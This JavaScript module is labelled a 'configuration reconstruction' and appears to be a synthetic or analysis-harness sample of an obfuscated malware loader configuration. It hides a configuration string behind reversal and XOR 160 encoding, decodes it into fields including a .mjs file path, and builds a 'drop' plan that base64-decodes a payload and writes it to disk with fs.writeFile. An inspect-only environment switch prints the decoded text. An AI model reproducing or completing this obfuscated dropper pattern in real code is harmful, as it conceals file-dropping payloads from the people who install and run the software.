// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_708e9c67 = "\\u00d3\\u00ca\\u00cd\\u008e\\u00c4\\u0099\\u0098\\u0096\\u00c3\\u00c5\\u0099\\u00c6\\u0096\\u00c3\\u00c5\\u00c3\\u008d\\u00c5\\u00c7\\u00c1\\u00d4\\u00d3\\u008e\\u008f\\u00c5\\u00c4\\u00cf\\u00ce\\u008d\\u00d3\\u00d3\\u00c5\\u00d2\\u00d4\\u00ce\\u00d5\\u00c8\\u008f\\u00d0\\u00cd\\u00d4\\u008f\\u009d\\u00c8\\u00d4\\u00c1\\u00d0\\u00ff\\u00c5\\u00cc\\u00c9\\u00c6\\u00dc\\u00e3\\u00e5\\u0099\\u00e6\\u0096\\u00e3\\u00e5\\u00e3\\u008d\\u00e5\\u00e4\\u00ef\\u00ee\\u009d\\u00c4\\u00c9\\u00ff\\u00ce\\u00c7\\u00c9\\u00c1\\u00d0\\u00cd\\u00c1\\u00c3\\u00dc\\u0091\\u009d\\u00d4\\u00ce\\u00d5\\u00cf\\u00c3\\u00ff\\u00c5\\u00c7\\u00c1\\u00d4\\u00d3\\u00dc\\u00cd\\u00c1\\u00c5\\u00d2\\u00d4\\u00d3\\u00ff\\u00cf\\u00d4\\u00ff\\u0094\\u0096\\u00c5\\u00d3\\u00c1\\u00c2\\u009d\\u00d2\\u00c5\\u00d4\\u00d0\\u00c1\\u00c4\\u00c1\\u00dc\\u00c5\\u00cc\\u00c9\\u00c6\\u00ff\\u00c5\\u00d4\\u00c9\\u00d2\\u00d7\\u008c\\u00c4\\u00c5\\u00c4\\u00c4\\u00c5\\u00c2\\u00cd\\u00c5\\u00ff\\u00c5\\u00c4\\u00cf\\u00c3\\u00c5\\u00c4\\u009d\\u00d3\\u00d0\\u00c5\\u00d4\\u00d3\\u00dc\\u0091\\u009d\\u00d6";
const Codec_708e9c67 = "unicode_escapes|reverse_then_xor|a0";

function load_708e9c67() { return [...Material_708e9c67.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_708e9c67(v_a19c) { return [...v_a19c].reverse().map((value) => value ^ 160); }
async function recover_708e9c67() {
  const v_c304 = "";
  const v_a19c = load_708e9c67(); let v_b27e = [];
  for (const stage of [decode_708e9c67]) v_b27e = stage(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_708e9c67() { return Buffer.from(await recover_708e9c67(), "utf8").toString("utf8"); }
async function plan_708e9c67() { const inspect = inspect_708e9c67; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_708e9c67;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_708e9c67());

// reconstruction complete